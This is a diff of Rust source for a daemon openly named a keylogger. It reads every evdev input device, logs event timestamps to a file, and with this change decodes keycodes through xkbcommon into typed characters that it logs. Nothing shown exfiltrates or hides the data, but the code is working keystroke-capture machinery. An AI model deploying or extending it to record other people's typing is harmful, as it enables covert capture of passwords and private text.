@@ -1,69 +1,21 @@
-use std::{io::Read, process::exit, time::UNIX_EPOCH};
+use std::{
+    io::{Read, Write},
+    process::exit,
+    time::UNIX_EPOCH,
+};
 
-use anyhow::{bail, Context, Error, Result};
+use anyhow::{bail, Context, Result};
 use daemonize::{Daemonize, Outcome};
-use evdev::{Device, InputEvent, InputEventKind, Key, LedType};
+use evdev::{Device, EventType, InputEvent, InputEventKind};
 use log::{debug, error, info, trace};
 use rustix::process::{kill_process, Pid, RawPid, Signal};
 use tokio::{
-    io::AsyncWriteExt,
     sync::mpsc::{self, Receiver},
     task::JoinSet,
 };
+use xkbcommon::xkb::{self, Keycode, State, CONTEXT_NO_FLAGS};
 
 const PID_FILE_PATH: &str = "/run/keylogger.pid";
-
-#[derive(Debug)]
-struct State {
-    caps_lock: bool,
-    num_lock: bool,
-    shift_count: i32,
-    alt_count: i32,
-    ctrl_count: i32,
-    meta_count: i32,
-}
-
-impl State {
-    const fn new(caps_lock: bool, num_lock: bool) -> Self {
-        Self {
-            caps_lock,
-            num_lock,
-            shift_count: 0,
-            alt_count: 0,
-            ctrl_count: 0,
-            meta_count: 0,
-        }
-    }
-
-    fn update(&mut self, event: InputEvent) {
-        let value: i32 = event.value();
-        match event.kind() {
-            InputEventKind::Led(led) => match led {
-                LedType::LED_CAPSL => self.caps_lock = value == 1,
-                LedType::LED_NUML => self.num_lock = value == 1,
-                _ => {}
-            },
-            InputEventKind::Key(key) => {
-                if let 0 | 1 = value {
-                    let counter = match key {
-                        Key::KEY_LEFTSHIFT | Key::KEY_RIGHTSHIFT => &mut self.shift_count,
-                        Key::KEY_RIGHTALT | Key::KEY_LEFTALT => &mut self.alt_count,
-                        Key::KEY_RIGHTCTRL | Key::KEY_LEFTCTRL => &mut self.ctrl_count,
-                        Key::KEY_LEFTMETA | Key::KEY_RIGHTMETA => &mut self.meta_count,
-                        _ => return,
-                    };
-                    Self::update_counter(counter, value);
-                }
-            }
-            _ => {}
-        }
-    }
-
-    fn update_counter(counter: &mut i32, value: i32) {
-        let new_val: i32 = *counter + value * 2 - 1;
-        *counter = if new_val >= 0 { new_val } else { 0 }
-    }
-}
 
 /// Creates keylogger daemon service. Will fork off a process and calls [`start()`]
 ///
@@ -107,8 +59,6 @@ pub fn start(log_file: std::fs::File) -> Result<()> {
 }
 
 async fn start_logger(log_file: std::fs::File) -> Result<()> {
-    let log_file = tokio::fs::File::from_std(log_file);
-
     trace!("keylogger starting");
     let devices: Vec<Device> = evdev::enumerate().map(|t| t.1).collect();
 
@@ -117,15 +67,9 @@ async fn start_logger(log_file: std::fs::File) -> Result<()> {
     }
     trace!("Found {} devices", devices.len());
 
-    let initial_state: State =
-        get_keyboard_state(&devices).context("Failed to initialize keyboard state")?;
-
     let (rx, mut join_set) = spawn_device_listeners(devices);
 
-    join_set.spawn(async move {
-        spawn_event_reader(rx, initial_state, log_file).await?;
-        Ok(())
-    });
+    join_set.spawn_blocking(move || event_reader(rx, log_file));
 
     if let Some(result) = join_set.join_next().await {
         result??;
@@ -134,24 +78,21 @@ async fn start_logger(log_file: std::fs::File) -> Result<()> {
     bail!("Unkown error occured");
 }
 
-fn get_keyboard_state(devices: &[Device]) -> Result<State> {
-    let led_device = devices
-        .iter()
-        .find(|device| {
-            let Some(leds) = device.supported_leds() else {
-                return false;
-            };
-            [LedType::LED_CAPSL, LedType::LED_NUML]
-                .iter()
-                .all(|led| leds.contains(*led))
-        })
-        .ok_or_else(|| Error::msg("Couldn't find device to read caps and num lock from"))?;
-    let led_state = led_device.get_led_state()?;
+fn get_keyboard_state() -> Result<State> {
+    let context = xkb::Context::new(CONTEXT_NO_FLAGS);
 
-    Ok(State::new(
-        led_state.contains(LedType::LED_CAPSL),
-        led_state.contains(LedType::LED_NUML),
-    ))
+    let keymap = xkb::Keymap::new_from_names(
+        &context,
+        "",                                       // rules
+        "pc105",                                  // model
+        "us",                                     // layout
+        "intl",                                   // variant
+        Some("grp:win_space_toggle".to_string()), // options
+        xkb::COMPILE_NO_FLAGS,
+    )
+    .context("Failed to create keymap")?;
+
+    Ok(xkb::State::new(&keymap))
 }
 
 fn spawn_device_listeners(devices: Vec<Device>) -> (Receiver<InputEvent>, JoinSet<Result<()>>) {
@@ -174,14 +115,10 @@ fn spawn_device_listeners(devices: Vec<Device>) -> (Receiver<InputEvent>, JoinSe
     (rx, join_set)
 }
 
-async fn spawn_event_reader(
-    mut rx: Receiver<InputEvent>,
-    initial_state: State,
-    mut log_file: tokio::fs::File,
-) -> Result<()> {
-    let mut state = initial_state;
+fn event_reader(mut rx: Receiver<InputEvent>, mut log_file: std::fs::File) -> Result<()> {
+    let state: State = get_keyboard_state().context("Failed to initialize keyboard state")?;
 
-    while let Some(eventr) = rx.recv().await {
+    while let Some(eventr) = rx.blocking_recv() {
         let time = eventr.timestamp();
         let t = time
             .duration_since(UNIX_EPOCH)
@@ -189,10 +126,19 @@ async fn spawn_event_reader(
             .as_nanos();
         log_file
             .write_all(format!("{t}\n").as_bytes())
-            .await
             .context("Failed to write to log")?;
-        state.update(eventr);
+        if eventr.event_type() != EventType::KEY {
+            continue;
+        }
+        // We add 8 to translate the linux keycode to the xkb keycode. Why? because it works.
+        // Why???? For historical reasons
+        // <https://xkbcommon.org/doc/current/keymap-text-format-v1.html#autotoc_md26>
+        // THE FUCK
+        let keycode = Keycode::new(u32::from(eventr.code()) + 8);
+        trace!("{keycode:?}");
+        let key = state.key_get_utf8(keycode);
         trace!("{eventr:?}");
+        info!("{key:?}");
     }
     bail!("Event receiver was closed")
 }
